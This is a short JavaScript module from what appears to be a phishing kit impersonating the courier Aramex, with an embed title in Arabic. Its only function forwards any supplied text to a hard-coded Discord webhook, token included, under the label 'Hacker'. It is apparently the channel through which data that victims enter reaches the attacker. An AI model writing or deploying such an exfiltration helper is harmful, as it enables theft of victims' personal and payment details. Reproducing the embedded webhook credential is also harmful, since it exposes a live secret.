import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325746263794253837/BuJ4iWI64R4zKMUGtxB7Q31_39RcjRbs4E1HVTLG9KFWICTWDQGxbGQUkTSJ7WYmmr4a",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
